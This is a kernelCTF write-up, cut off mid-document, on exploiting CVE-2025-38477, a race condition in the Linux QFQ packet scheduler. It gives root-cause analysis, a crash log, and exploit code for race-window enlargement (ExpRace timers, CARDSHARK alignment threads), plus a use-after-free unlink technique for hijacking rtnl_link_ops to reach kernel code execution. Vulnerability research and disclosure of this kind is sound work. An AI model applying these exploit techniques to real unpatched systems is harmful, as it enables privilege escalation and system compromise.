Exploit Details
===============

In this writeup we will explain how we exploited CVE-2025-38477 to capture the flag on a
cos-109-17800.519.32 instance.

# Prologue

We began our investigation after our custom fuzzer triggered a null-dereference
crash. By understanding the root cause, we realized the crash was a result of a
Race Condition. After solving many challenges, we successfully transformed the
initial bug into a Use-After-Free (UAF) vulnerability, ultimately perfoming
kernel privilege escalation.

## Challenges

Exploiting CVE-2025-38477 proved to be a super hard challenge. The vulnerability
requires strict timing requirements to trigger, forcing us to devise an entirely
new exploitation path. Our final exploit combines advanced kernel race-condition
techniques with several novel exploitation primitives.

We encourage you to take the challenge yourself before reading further! You can
begin your exploration using the [Proof-of-Concept (PoC)][3] or by reviewing the
official [Patch][4].

## What We Cover

In this write-up, we cover:

- Root-cause analysis of CVE-2025-38477
- Building an exploitable race condition
- Is it an “impossible” race condition?
- Making the “impossible” possible: ExpRace
- Enlarging the Race Window
- Taming uncertainty: CARDSHARK
- Novel techniques
- Overview of exploitation

## Acknowledgments

The exploitation was a massive team effort, exploitation for kernelCTF was
primarily done by @n132 and @swing. It wouldn’t have been possible without
crucial help from @kyle and @zolutal. Our thanks also go to @Zardus and @zolutal
for proofreading, and to Linux kernel developer Cong Wang for assistance with
the final patch.

# Root-Cause Analysis

The core issue lies in `qfq_change_agg` within the data-path function
`qfq_enqueue`. Since this function does not hold the `rtnl_mutex` during
resource modification, it can race with control-path actions (like
`qfq_dump_class`) that access the same aggregate (agg) resource. This concurrent
access of the aggregate pointer creates the race condition window.

## Initial Crash

The vulnerability was first discovered by our custom fuzzer, which resulted in a
 null-dereference crash:

```
general protection fault, probably for non-canonical address 0xdffffc0000000005: 0000 [#1] PREEMPT SMP KASAN NOPTI
KASAN: null-ptr-deref in range [0x0000000000000028-0x000000000000002f]
CPU: 0 PID: 77229 Comm: syz.5.25826 Not tainted 6.6.94+ #3
Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
RIP: 0010:qfq_dump_class+0x24b/0x530 net/sched/sch_qfq.c:639
Code: fc ff df 48 c1 ea 03 80 3c 02 00 0f 85 bd 02 00 00 48 ba 00 00 00 00 00 fc ff df 48 8b 45 68 48 8d 78 28 48 89 f9 48 c1 e9 03 <0f> b6 14 11 84 d2 74 09 80 fa 03 0f 8e fd 01 00 00 8b 40 28 ba 04
RSP: 0018:ffff888012346e78 EFLAGS: 00010216
RAX: 0000000000000000 RBX: ffff88800b74f8c0 RCX: 0000000000000005
RDX: dffffc0000000000 RSI: ffffffff8482fa2e RDI: 0000000000000028
RBP: ffff88801026ec00 R08: 0000000000000005 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000000 R12: ffff888014bbe02c
R13: 1ffff11002468dd2 R14: ffff88800b74f980 R15: ffff88800b74f988
FS:  00007bc1104116c0(0000) GS:ffff88811ac00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000000000000 CR3: 000000000de44000 CR4: 0000000000350ef0
```

The crash occurred in the control-path function `qfq_dump_class` (Line 639),
attempting to access members of a null aggregate pointer:

```c
	if (nla_put_u32(skb, TCA_QFQ_WEIGHT, cl->agg->class_weight) ||
	    nla_put_u32(skb, TCA_QFQ_LMAX, cl->agg->lmax))
```

The pointer `cl->agg` was found to be NULL, leading to the general protection
fault.

## Tracing the Race Condition

The race occurs when one thread (Thread 0) is dynamically changing the aggregate
attached to a QFQ class (cl), while a second thread (Thread 1) is reading the
class configuration.


We have two classes, c1 and c2, attached to agg1 and agg2 respectively. Then, we
spawn two threads to trigger the race condition bug.

### Thread 0: Changing the Aggregate (qfq_change_agg)


Thread 0
initiates a change to attach class `c1` to a new aggregate (`agg2`) via
`qfq_change_agg`:

```c
/* Move class to a new aggregate, matching the new class weight and/or lmax */
static int qfq_change_agg(struct Qdisc *sch, struct qfq_class *cl, u32 weight,
			   u32 lmax)
{
	struct qfq_sched *q = qdisc_priv(sch);
	struct qfq_aggregate *new_agg;

	/* 'lmax' can range from [QFQ_MIN_LMAX, pktlen + stab overhead] */
	if (lmax > QFQ_MAX_LMAX)
		return -EINVAL;

	// 1. Find/Create the new aggregate (new_agg)
	new_agg = qfq_find_agg(q, lmax, weight);
	if (new_agg == NULL) { /* create new aggregate */
		new_agg = kzalloc(sizeof(*new_agg), GFP_ATOMIC);
		if (new_agg == NULL)
			return -ENOBUFS;
		qfq_init_agg(q, new_agg, lmax, weight);
	}
	// 2. Remove the class from its old aggregate (agg1)
	qfq_deact_rm_from_agg(q, cl);
	// 3. Attach the class to the new aggregate (agg2)
	qfq_add_to_agg(q, new_agg, cl);

	return 0;
}
```

The critical window opens between step 2 and step 3. Examining the removal
function (`qfq_rm_from_agg`) reveals the exact moment `cl->agg` is set to
`NULL`:

```c

/* Remove class from its parent aggregate. */
static void qfq_rm_from_agg(struct qfq_sched *q, struct qfq_class *cl)
{
	struct qfq_aggregate *agg = cl->agg;

	cl->agg = NULL; // <-- **AGGREGATE POINTER SET TO NULL HERE**
	if (agg->num_classes == 1) { /* agg being emptied, destroy it */
		qfq_destroy_agg(q, agg);
		return;
	}
	qfq_update_agg(q, agg, agg->num_classes-1);
}
/* Deschedule class and remove it from its parent aggregate. */
static void qfq_deact_rm_from_agg(struct qfq_sched *q, struct qfq_class *cl)
{
	if (cl->qdisc->q.qlen > 0) /* class is active */
		qfq_deactivate_class(q, cl);

	qfq_rm_from_agg(q, cl);
}
...
/* Add class to aggregate. */
static void qfq_add_to_agg(struct qfq_sched *q,
			   struct qfq_aggregate *agg,
			   struct qfq_class *cl)
{
	cl->agg = agg; // <-- **AGGREGATE POINTER RESTORED HERE**

	qfq_update_agg(q, agg, agg->num_classes+1);
	if (cl->qdisc->q.qlen > 0) { /* adding an active class */
		list_add_tail(&cl->alist, &agg->active);
		if (list_first_entry(&agg->active, struct qfq_class, alist) ==
		    cl && q->in_serv_agg != agg) /* agg was inactive */
			qfq_activate_agg(q, agg, enqueue); /* schedule agg */
	}
}
```

### Thread 1: Reading the Aggregate (qfq_dump_class)

The window for Thread 1 to race and cause a crash is:
```
qfq_change_agg (Thread 0)
    qfq_deact_rm_from_agg
        qfq_rm_from_agg
            cl->agg = NULL;
            <---------- **WINDOW OPEN** ---------->
    qfq_add_to_agg
        cl->agg = agg;
        <---------- **WINDOW CLOSE** --------->
```


If Thread 1 executes the crash-triggering code in `qfq_dump_class` (which is
part of the control path) exactly when `cl->agg` is `NULL` but hasn't yet been
updated by `qfq_add_to_agg`, the `null-dereference` occurs. This race is
possible because `qfq_change_agg` is used in the data path (triggered via
`qfq_enqueue`) and does not hold the necessary protective lock (`rtnl_mutex`),
while the dump function does not adequately check for the transient `NULL`
state.


> Background knowledge:
> - 1. Control Path Lock (Configuration): `rtnl_mutex` protects all Qdisc
>      options/configuration.
> - 2. Data Path Lock: `sch_tree_lock` protects the actual Qdisc data structures
> - 3. Control path functions (protected by `rtnl_mutex`) will also acquire the
>      `sch_tree_lock` when they are directly configure the Qdisc.


## Root Cause

`qfq_change_agg` in `qfq_enqueue` could race with any actions (not protected by
`sch_tree_lock`) on agg since it changes the resource in data path.


While the initial crash in `qfq_dump_class` was an unexploitable
`null-dereference`. However, the root cause shows we may able to build other
primitives to race `qfq_change_agg` with other agg actions.

# Build an Exploitable Race Condition

Based on the root cause, we exhaustively analyzed all aggregate (agg) actions
within the `QFQ` scheduler to find a primitive more potent than the initial
`null-Dereference`.

## Agg Actions: Searching for UAF Write

If our goal is to achieve a stable "UAF Write" primitive (critical for
controlling execution flow and achieving privilege escalation), we must find an
aggregate modification action (e.g., `free` or `edit`) that is not protected by
`sch_tree_lock`.

Most aggregate read actions are unprotected but only lead to an unexploitable
`null-Dereference` (dereferencing a pointer after the aggregate has been
free-ed). We identified only one non-read aggregate action that operates outside
of the `sch_tree_lock`'s critical area, making exploitation possible:
`qfq_delete_class`.

## The Key Target: qfq_delete_class

```c
static int qfq_delete_class(struct Qdisc *sch, unsigned long arg,
			    struct netlink_ext_ack *extack)
{
	struct qfq_sched *q = qdisc_priv(sch);
	struct qfq_class *cl = (struct qfq_class *)arg;

	if (qdisc_class_in_use(&cl->common)) {
		NL_SET_ERR_MSG_MOD(extack, "QFQ class in use");
		return -EBUSY;
	}

	sch_tree_lock(sch);

	qdisc_purge_queue(cl->qdisc);
	qdisc_class_hash_remove(&q->clhash, &cl->common);

	sch_tree_unlock(sch); // <-- Lock released here
	/*
		Out of locked critical area. The deletion of agg
		has potential racing issue against qfq_change_agg
	*/
	qfq_destroy_class(sch, cl);
	return 0;
}
```

The function releases `sch_tree_lock` before calling `qfq_destroy_class`. While
this pattern is used in other schedulers, it is buggy for QFQ because
`qfq_destroy_class` calls `qfq_rm_from_agg`, which can conditionally free the
aggregate:

```c
static void qfq_destroy_class(struct Qdisc *sch, struct qfq_class *cl)
{
	struct qfq_sched *q = qdisc_priv(sch);

	qfq_rm_from_agg(q, cl);
	gen_kill_estimator(&cl->rate_est);
	qdisc_put(cl->qdisc);
	kfree(cl);
}
```

Within `qfq_rm_from_agg`, if the class was the last one attached to the
aggregate, the aggregate is destroyed:

```c
static void qfq_rm_from_agg(struct qfq_sched *q, struct qfq_class *cl)
{
	struct qfq_aggregate *agg = cl->agg;

	cl->agg = NULL;
	if (agg->num_classes == 1) { /* agg being emptied, destroy it */
		qfq_destroy_agg(q, agg); // <-- Conditional kfree(agg) occurs here!
...
```

This is the key: if we race `qfq_destroy_class` against the aggregate
modification happening in `qfq_change_agg`, we can trigger a `Use-After-Free`
(UAF) Write primitive.

## Race Condition to UAF Write

The UAF-Write primitive is achieved by setting up the following race:

- Setup: We have two classes, c1 and c2, attached to agg1 and agg2 respectively.
- Thread 1: Calls `qfq_change_agg`, to attach agg1 to c2 (triggering the
  conditional free of agg1)
- Thread 2: Calls `qfq_delete_class` on c1, which triggers the conditional free
  of agg1

To clearly show race condition window, we first list several important points of
both threads

### Thread 1: qfq_change_agg

This thread attempts to detach agg1 on c1 by attaching agg1 to c2.

```
sch_tree_lock
...
qfq_change_agg
	new_agg = qfq_find_agg(q, lmax, weight);
		hlist_for_each_entry(agg, &q->nonfull_aggs, nonfull_next) until we find (agg->lmax == lmax && agg->class_weight == weight)
	qfq_add_to_agg(q, new_agg, cl);
```

### Thread 2: qfq_delete_class

This thread deletes c1, which frees agg1.

```
sch_tree_unlock
qfq_destroy_class
	qfq_rm_from_agg
		agg = cl->agg
		cl->agg = NULL;
		if (agg->num_classes == 1) then qfq_destroy_agg(q, agg);
			hlist_del_init(&agg->nonfull_next);
			kfree(agg);

```

# Is it an “impossible” Race Condition?


The successful exploitation of this UAF requires satisfying two non-trivial,
dependent conditions:

```
Condition 1:
	Thread 2: sch_tree_unlock
	Thread 1: sch_tree_lock
Condition 2:
	Thread 1: Find the new_agg in the agg hlist
	Thread 2: hlist_del_init(&agg->nonfull_next);
```

These two conditions create a highly constrained race:
- Condition 1 forces Thread 1 to wait until Thread 2 releases the lock.
- Condition 2 dictates that Thread 1 must successfully find the target aggregate
  (agg2) before Thread 2 removes it from the list.


## The Nature of the "Impossible" Race

A simple race condition requires a single, well-timed operation from Thread 2 to
land within a specific execution window of Thread 1:


```s
Thread 1: ---------------| Race Condition Window |----->
Thread 2: --------------------X------------------------>
```

For such simple races, exploitability is often about precisely adjusting the
timing of operation $\mathbf{X}$. However, the presence of two dependent
conditions, each with its own execution window ($W_1$ and $W_2$), complicates
the scenario significantly.


When two windows are involved, four general cases describe their overlap. The
conditions required for CVE-2025-38477 correspond to Case 2 in the
table below, where the execution of $W_2$ must start earlier than $W_1$ and
finish later than $W_1$ to satisfy the combined constraints.

```s
# Not consider the cases that one of Window1's edges == one of Window2's edges
Case 1: Window1.left > Window2.left && Window1.right > Window2.right
	Thread 1: ---------------|--Window 1--|--------------->
	Thread 2: --------------|--Window 2--|---------------->
Case 2: Window1.left > Window2.left && Window1.right < Window2.right
	Thread 1: ---------------|--Window 1--|--------------->
	Thread 2: --------------|--Window 2----|-------------->
Case 3: Window1.left < Window2.left && Window1.right > Window2.right
	Thread 1: --------------|---Window 1--|--------------->
	Thread 2: ---------------|-Window 2--|---------------->
Case 4: Window1.left < Window2.left && Window1.right < Window2.right
	Thread 1: --------------|---Window 1--|--------------->
	Thread 2: ---------------|-Window 2----|-------------->
```


Case 2 and Case 3 could be "impossible" (in fact, hard) race condition bugs. For
example, if we measured that $W_1$ costs 10000 CPU cycles while $W_2$ costs
20000 CPU cycles. It's impossible (without changing the window size) to satisfy
both `Window1.right > Window2.right and Window1.left < Window2.left`.
Unfortunately, CVE-2025-38477 belongs to this "impossible" case.

By instrumenting the source code and measuring the execution times (in CPU
cycles), we found the following average widths for the critical windows:
- Window 1 ($W_1$): $483.62$ cycles
- Window 2 ($W_2$): $62.96$ cycles

The result shows the $W_1$ is larger than $W_2$. Thus, it's "impossible" to
exploit this race condition if we can't enlarge $W_2$ or shrink $W_1$.

# Make the Impossible Possible: ExpRace

The highly constrained nature of this race condition led us to investigate more
race condition exploit techniques. We adopted a strategy inspired by
[ExpRace][2], a technique designed to deliberately enlarge a critical race
window using hardware interrupts. Since the interrupt-based methods in the paper
were incompatible with the two-core KernelCTF environment (e.g., net-based HW
interrupts required three cores, and membarrier proved unreliable), we
implemented the Timer-Based Hardware Interrupts method described in the paper.


## Timer-Based Hardware Interrupts

This technique creates a continuous stream of hardware interrupts to preempt the
targeted CPU, effectively stretching the duration of a thread's critical window.

The core implementation involves a dedicated "interrupter" thread:

```c
#define INTERRUPT_INTERVAL_US 31

int interrupter(){
    unsigned long int tmp;
    pinCPU(1); // Make sure we are on the same CPU as del
    setNice(-20);
    signal(SIGALRM, handler);
    struct itimerval t = {
        .it_interval = {0, INTERRUPT_INTERVAL_US},
        .it_value = {0, INTERRUPT_INTERVAL_US}
    };
    setitimer(ITIMER_REAL, &t, 0);
    while(1) pause();
}
```

The script configures a real-time timer (`ITIMER_REAL`) to interrupt the CPU
approximately every $31\ \mu s$. By pinning the interrupter to the same core as
the thread running the smaller window (Thread 2's deletion), we force the kernel
to switch context repeatedly, stretching that thread's overall execution time.


## Quantified Impact


This technique successfully enlarged the target window (Window 2, associated
with the deletion thread) significantly:

- Original Average Window $W_2$ Width: $62.96$ cycles
- Enlarged Average Window $W_2$ Width: $404.714$ cycles

For exploitation, we don't care much about the average window size but the
cases that the enlarged window width is larger than $W_1$. In our experiments,
this technique transformed the race condition possible in 126 out of every
1,000 trials (approximately 1 in 8 trials), where the enlarged $W_2$ was wider than
$W_1$.


## Understanding ExpRace Success Rates


The ExpRace paradigm is designed to transform "hard" race cases (Case 2/3) into
"easier" cases (Case 1/4) by strategically inserting an interrupt.

The fundamental principle is to introduce a context switch, which consumes
several thousand CPU cycles, which is an execution time similar to a
moderate-sized syscall. If this interrupt lands within the target's small
window, it effectively expands that window's duration by the length of the
interrupt handling routine, making the race winnable.

The exploit's ultimate success rate is directly proportional to the width of the
target window (the window we are trying to hit):

$$\text{Success Rate} \propto \text{Target Window Width}$$


A larger target window provides a wider time frame for the kernel to trigger
interrupt. For example, if the target window is only $2$ CPU cycles wide,
hitting it is statistically near-impossible. For the vulnerability
CVE-2025-38477, the un-enlarged critical window was only about $60$ CPU cycles
(or $\sim 40$ cycles when removing outliers), which is very difficult to hit. In
later sections we enlarge the window and then applied some alignment techniques
(CARDSHARK) to make exploitation possible on KernelCTF.

## Practical Exploitation Tips for Timer-Based ExpRace


Debugging highly constrained race conditions is notoriously time-comsuming.
Based on our experience in the KernelCTF environment, the following practical
tips enhance the reliability of the timer-based ExpRace method:

- Priority: Using a maximum nice value (`setNice(-20)`) for the interrupter
thread is crucial
- Interval: The interrupt interval is a key parameter. In practice, a range of
  $10$ to $30\ \mu s$ yielded the highest success rates (tuning required for
  different enviroments), as intervals that are too high or too low may be less
  effective at landing within the tight window.
- Timer Choice: setitimer was found to be more reliable for this purpose than
  timerfd_create.
- Timer Type: The ITIMER_REAL type (which counts down in real time)
  outperformed both ITIMER_VIRTUAL and ITIMER_PROF.
- Redundancy: Creating multiple background timers provided no measurable benefit
  to the success rate.


# Enlarging the Race Window: from UAF to Reference Count Issue

While `ExpRace` made the original UAF technically possible, the $1/8$ "winnable
rate" was highly impractical, requiring hours of trial-and-error even with
advanced alignment techniques (like `BLIND SHARK`, described later). To achieve reliable
exploitation in the KernelCTF environment, it became necessary to enlarge the
critical race window.


The original UAF primitive focused on the `qfq_destroy_agg` path within
`qfq_rm_from_agg` when `agg->num_classes == 1`.

```c
/* Remove class from its parent aggregate. */
static void qfq_rm_from_agg(struct qfq_sched *q, struct qfq_class *cl)
{
	struct qfq_aggregate *agg = cl->agg;

	cl->agg = NULL;
	if (agg->num_classes == 1) { /* agg being emptied, destroy it */
		qfq_destroy_agg(q, agg); // Original UAF target
		return;
	}
	qfq_update_agg(q, agg, agg->num_classes-1); // New Reference Count target
}
```

We realized that a direct UAF was not the only path to a successful exploit.
Instead, we could leverage the race condition to create a refcount issue via the
`qfq_update_agg` call when `agg->num_classes > 1`, and then transform that
refcount issue into a UAF to make it more robust.


> Note on Original UAF Complexity: The original UAF primitive was also abandoned
> due to its complexity. It required a UAF-triggered $\text{refcnt}++$ at a
> worst offset ($\text{0x40}$ in a $\text{0x80}$ object, where the metadata of a
> freed objects locates), which made exploitation time-consuming and unreliable

## Race Condition to Reference Count Issue


The goal is to use the race to create a condition where the aggregate's
reference count is greater than its actual references ($\text{refcnt} >
\text{references}$). This over-reference allows us to later force a double-free
or UAF. We construct a race between two threads modifying the agg->num_classes
field:

### Thread 1: Increase `num_classes` (from `qfq_change_agg`)


Thread 1 aims to increase the reference count.

```
sch_tree_lock
...
qfq_change_agg
	qfq_add_to_agg(q, new_agg, cl);
		qfq_update_agg(q, agg, agg->num_classes+1);
			agg->num_classes = new_num_classes; // Update: Old_val + 1
```

### Thread 2: Decrease `num_classes` (from `qfq_delete_class`)

Thread 2 aims to decrease the reference count. This occurs during the deletion
of a class:

```
sch_tree_unlock
qfq_destroy_class
	qfq_rm_from_agg
		qfq_update_agg(q, agg, agg->num_classes-1);
			agg->num_classes = new_num_classes; // Update: Old_val - 1
```

### Required Conditions for Refcount Miscounting


The goal of this race is to successfully achieve `Reference Count > existing agg
references`, leading to a Use-After-Free (UAF) vulnerability. This requires
specific, interleaved execution of a decreasing primitive (`qfq_delete_class`) and
an increasing primitive (`qfq_change_agg`).

To identify the optimal exploit path, we list the three possible methods to race
the primitives which affect the aggregate reference count:


|   Methods| 1st Race Primtive                             | 2nd Race Primtive                             | Outcome |
| ----: | --------------------------------------------- | --------------------------------------------- | ------------ |
| Method 1 | `qfq_update_agg(q, agg, agg->num_classes-1);` | `qfq_update_agg(q, agg, agg->num_classes-1);` | Memory Leak   |
| Method 2 | `qfq_update_agg(q, agg, agg->num_classes-1);` | `qfq_update_agg(q, agg, agg->num_classes+1);` | UAF   |
| Method 3 | `qfq_update_agg(q, agg, agg->num_classes+1);` | `qfq_update_agg(q, agg, agg->num_classes+1);` | UAF   |

The function `qfq_change_agg` can be used to increase or decrease the refcount
while the function `qfq_delete_class` can only be used to decrease the refcount.
Therfore, we can only use method 2 to create a UAF primitive. Considering that
we have to have one thread increase the refcount and another to decrease the
refcount, `qfq_change_agg` must be used to increase the refcount. Thus, we have
Thread 1 calling `qfq_chaneg_agg` and Thread 2 calling `qfq_delete_class`. There
are also two conditions we have to satisfy to make the race condition happen.

#### Condition 1: Lock Bypass

As with the original vulnerability, the first requirement is the successful
bypassing of mutual exclusion.

```
Condition 1:
	Thread 2: sch_tree_unlock
	Thread 1: sch_tree_lock
```

Thread 2 must release the lock before Thread 1 attempts to acquire it, allowing
both threads to operate concurrently on the shared data structure (agg).

#### Condition 2: Race Condition Bug -> Update Overwrite


This condition specifically targets the shared agg->num_classes counter, which
dictates the perceived reference count. The desired outcome is an overwrite that
incorrectly lowers the counter after a true reference has been added.

```
Condition 2:
	Thread 1: agg->num_classes = new_num_classes;
	// Increase: new_num_classes = Old_val+1
	Thread 2: agg->num_classes = new_num_classes;
	// Decrease: new_num_classes = Old_Val-1
```

This sequence of events is crucial: Thread 1 correctly updates the underlying
aggregate structure (increasing the true reference count) but its counter update
is immediately discarded by Thread 2's subsequent write.

The net effect is that the true reference count has gone from $N$ to $N+1$ (by
Thread 1) and then back to $N-1$ (by Thread 2's overwrite), while the real agg
referrence counter is $N$. This achieves the target miscount: `Refcount ($N$) >
agg->num_classes ($N-1$)`. For example, Thread 1 tries to update `num_classes`
from 3 to 4 while Thread 2 tries to update `num_classes` from 3 to 2. If we race
them correctly, the `agg->num_classes` will first be modified by Thread 1 and
then over written by Thread 2 to 2. However, if there is no race condition it
should be 3 (3+1-1). Thus, we achived `Refcount ($N$) > agg->num_classes
($N-1$)`.


#### Larger Target Window for ExpRace

These two conditions also make this race condition a "case 2" racing:
```
Case 2: Window1.left > Widnow2.left && Window1.right < Window2.right
	Thread 1: ---------------|--Window 1--|--------------->
	Thread 2: --------------|--Window 2----|-------------->
```

However, we got some good news!

- Window1.width = $769.94$ cycles
- Window2.width = $103.15$ cycles

This larger target window size (Window2) is critical because it greatly improves
the probability of a successful interrupt insertion (metioned in ExpRace
Section), making the race condition much easier to hit. As a result,
exploitation is now feasible in approximately 15 minutes without the use of race
condition exploitation alignment techiniques (CARDSHARK).


Furthermore, this primitive is more robust. Since a failed attack only results
in a memory leak (rather than an immediate crash), the attacker has an infinite
opportunity to attempt the race on a single connection, significantly increasing
reliability. In summary, routing the vulnerability through a Refcount Miscount
$\rightarrow$ UAF sequence makes the primitive easier and more reliable to
exploit.

# Taming uncertainty: CARDSHARK


In practice, this vulnerability remained hard to exploit quickly. KernelCTF only
accepts the first submission, and we were targeting the `lts` track (then
including `ns` in the `lts` channel), so speed was essential.


ExpRace made a hard exploit much feasible, but it amplified variance: our
window-width logs were inconsistent, which made the exploit brittle. We needed
to reduce this uncertainty.

A recent kernel-exploitation paper addressed the similar challenge and proposed
a way to mitigate the uncertainty: [CARDSHARK][1]. The paper introduces the
methods to align two threads to increase the certainty. We used the method
BLIND-SHARK from the paper:


```c
#define NICE_LOW_PRIO 19
#define NICE_HIGH_PRIO -20
#define UPGRADE_MSG_SIZE (0x400 - 42)

u8 flag1, flag2, flag3,stop;
size_t racer_delay = 0;
size_t racee_delay = 0 ;
static void delay(size_t n){
  size_t end;
  end = rdtsc()+n;
  while(rdtsc()<end);
  return;
}
void thr_racee(){
    setNice(NICE_LOW_PRIO); // Lowest priority
    flag1 = 1;
    stop = 0 ;
    while(!flag3);
    delay(racee_delay);
    // CPU 1
    NLMsgSend(nl,del1); // del -> dec;
    stop = 1;
}
void thr_racer(){
    setNice(NICE_HIGH_PRIO); // Highest priority
    flag2 = 1;
    while(!flag3);
    delay(racer_delay);
    // CPU 0
    write(inet_sock_fd, "", UPGRADE_MSG_SIZE); // upgrade
    while(!stop){
        NLMsgSend(nl,tclass_0x20002_create); // change it back
        write(inet_sock_fd, "", UPGRADE_MSG_SIZE); // upgrade
    }
}
void race_attemp(){
    unsigned long int thrs[2];
    pinCPU(1);
    pthread_create(&thrs[0],0,thr_racee,0);
    pinCPU(0);
    pthread_create(&thrs[1],0,thr_racer,0);
    while(!flag1 || !flag2);
    flag3 = 1;
    pthread_join(thrs[0],0);
    pthread_join(thrs[1],0);
}
void cardshark(long long align_time){
    flag1 = flag2 = flag3 = 0;
    if(align_time  > 0 )
      racer_delay = align_time;
    else
      racee_delay = -align_time;
    race_attemp();
}
```


We couldn’t reliably hit the race without CARDSHARK/BLIND-SHARK. These
techniques turned an uncertain race into a practical one: with CARDSHARK we
achieved a local exploit in ~15 seconds on average, and with BLIND-SHARK we
landed the remote exploit in ~24 minutes.

# Novel Techniques makes UAF-Unlink to ACE: LL_ATK and NPerm

By combining academic race-condition techniques, we reliably hit the bug and
obtain a use-after-free (UAF) on struct `qfq_aggregate`, which is in the
kmalloc-128 slab:

```c
struct qfq_aggregate {
	struct hlist_node          next;                 /*     0  0x10 */
	u64                        S;                    /*  0x10   0x8 */
	u64                        F;                    /*  0x18   0x8 */
	struct qfq_group *         grp;                  /*  0x20   0x8 */
	u32                        class_weight;         /*  0x28   0x4 */
	int                        lmax;                 /*  0x2c   0x4 */
	u32                        inv_w;                /*  0x30   0x4 */
	u32                        budgetmax;            /*  0x34   0x4 */
	u32                        initial_budget;       /*  0x38   0x4 */
	u32                        budget;               /*  0x3c   0x4 */
	/* --- cacheline 1 boundary (64 bytes) --- */
	int                        num_classes;          /*  0x40   0x4 */

	/* XXX 4 bytes hole, try to pack */

	struct list_head           active;               /*  0x48  0x10 */
	struct hlist_node          nonfull_next;         /*  0x58  0x10 */

	/* size: 104, cachelines: 2, members: 13 */
	/* sum members: 100, holes: 1, sum holes: 4 */
	/* last cacheline: 40 bytes */
};
```

With an agg pointer referencing a freed object, classic strategies include
same-cache refill (kmalloc-128) or cross-cache exploitation. These are too heavy
if we are gonna try several thousands times and only confirm the race once we build
a UAF-read (e.g., by refilling with a readable struct). To win KernelCTF, we
design a much lighter path that starts from a UAF-free with an unlink and
requires only a KASLR base leak to reach arbitrary code execution. This combines
two novel techniques: `LL_ATK` and `NPerm`.

## UAF-Unlink

Given an agg pointing to freed-and-refilled object, we can free the refilled
object and trigger the unlink in `qfq_destroy_agg`:


```c
static void qfq_destroy_agg(struct qfq_sched *q, struct qfq_aggregate *agg)
{
	hlist_del_init(&agg->nonfull_next);
	q->wsum -= agg->class_weight;
	if (q->wsum != 0)
		q->iwsum = ONE_FP / q->wsum;

	if (q->in_serv_agg == agg)
		q->in_serv_agg = qfq_choose_next_agg(q);
	kfree(agg);
}
```

The unlink action (`hlist_del_init(&agg->nonfull_next)`) provides an arbitrary-address unlink primitive:

```c
static inline void __hlist_del(struct hlist_node *n)
{
	struct hlist_node *next = n->next;
	struct hlist_node **pprev = n->pprev;

	WRITE_ONCE(*pprev, next);
	if (next)
		WRITE_ONCE(next->pprev, pprev);
}
```

Arbitrary-Address Unlink isn’t common in kernel exploits, but we show it’s
sufficient for Arbitrary-Code-Execution(ACE) when paired with our techniques.

Arbitrary-Address-Unlink on a kernel heap object (agg object for CVE-2025-38477)
means we can trigger the unlink option (e.g., `hlist_del_init`) and control its
parameter (e.g. agg->nonfull_next). With a UAF, this is straightforward:

- UAF to have a pointer pointing to a free-ed kernel heap object
- Refill the object with payload data (e.g. set qfq_aggregate->nonfull_next)
- UAF-Free the pointer to trigger unlink
- Unlink writes 8 bytes to an arbitrary address


So, Arbitrary-Address Unlink gives us an 8-byte arbitrary write. It’s not
arbitrary-length and might seem weak, and we may need a heap leak primitive.

In the following three sections we combine two novel techniques to gain ACE from
an arbitary UAF-Unlink without additional address leaking. There are two key
questions:
- Where to write (solved by `LL_ATK`)
- What to write (solved by `NPerm`)

## UAF Unlink Attack Targeting Linked Lists: LL_ATK


Idea. While reproducing CVE-2023-4623, I designed `LL_ATK` to resolve the “where to
write” problem in UAF-unlink exploits. The key is to treat arbitrary-address
unlink as a way to link an attacker-controlled (refilled) fake node into any
existing linked list. By writing the address of a crafted fake node into a valid
list, we later make legitimate code iterate that list and invoke function
pointers embedded in our fake node to archive code execution.


Example. In our exploit, we splice a fake node into the kernel’s `rtnl_link_ops`
list. If the fake node’s name field and layout are set properly, the kernel 's
traversal over rtnl_link_ops reaches our node and calls its function pointers.
Crucially, this path does not require a heap address leak.

```c
struct rtnl_link_ops {
	struct list_head           list;                 /*     0  0x10 */
	const char  *              kind;                 /*  0x10   0x8 */
	size_t                     priv_size;            /*  0x18   0x8 */
	struct net_device *        (*alloc)(struct nlattr * *, const char  *, unsigned char, unsigned int, unsigned int); /*  0x20   0x8 */
	void                       (*setup)(struct net_device *); /*  0x28   0x8 */
	bool                       netns_refund;         /*  0x30   0x1 */

	/* XXX 3 bytes hole, try to pack */

	unsigned int               maxtype;              /*  0x34   0x4 */
	const struct nla_policy  * policy;               /*  0x38   0x8 */
	/* --- cacheline 1 boundary (64 bytes) --- */
	int                        (*validate)(struct nlattr * *, struct nlattr * *, struct netlink_ext_ack *); /*  0x40   0x8 */
	int                        (*newlink)(struct net *, struct net_device *, struct nlattr * *, struct nlattr * *, struct netlink_ext_ack *); /*  0x48   0x8 */
	int                        (*changelink)(struct net_device *, struct nlattr * *, struct nlattr * *, struct netlink_ext_ack *); /*  0x50   0x8 */
	void                       (*dellink)(struct net_device *, struct list_head *); /*  0x58   0x8 */
	size_t                     (*get_size)(const struct net_device  *); /*  0x60   0x8 */
	int                        (*fill_info)(struct sk_buff *, const struct net_device  *); /*  0x68   0x8 */
	size_t                     (*get_xstats_size)(const struct net_device  *); /*  0x70   0x8 */
	int                        (*fill_xstats)(struct sk_buff *, const struct net_device  *); /*  0x78   0x8 */
	/* --- cacheline 2 boundary (128 bytes) --- */
	unsigned int               (*get_num_tx_queues)(void); /*  0x80   0x8 */
	unsigned int               (*get_num_rx_queues)(void); /*  0x88   0x8 */
	unsigned int               slave_maxtype;        /*  0x90   0x4 */

	/* XXX 4 bytes hole, try to pack */

	const struct nla_policy  * slave_policy;         /*  0x98   0x8 */
	int                        (*slave_changelink)(struct net_device *, struct net_device *, struct nlattr * *, struct nlattr * *, struct netlink_ext_ack *); /*  0xa0   0x8 */
	size_t                     (*get_slave_size)(const struct net_device  *, const struct net_device  *); /*  0xa8   0x8 */
	int                        (*fill_slave_info)(struct sk_buff *, const struct net_device  *, const struct net_device  *); /*  0xb0   0x8 */
	struct net *               (*get_link_net)(const struct net_device  *); /*  0xb8   0x8 */
	/* --- cacheline 3 boundary (192 bytes) --- */
	size_t                     (*get_linkxstats_size)(const struct net_device  *, int); /*  0xc0   0x8 */
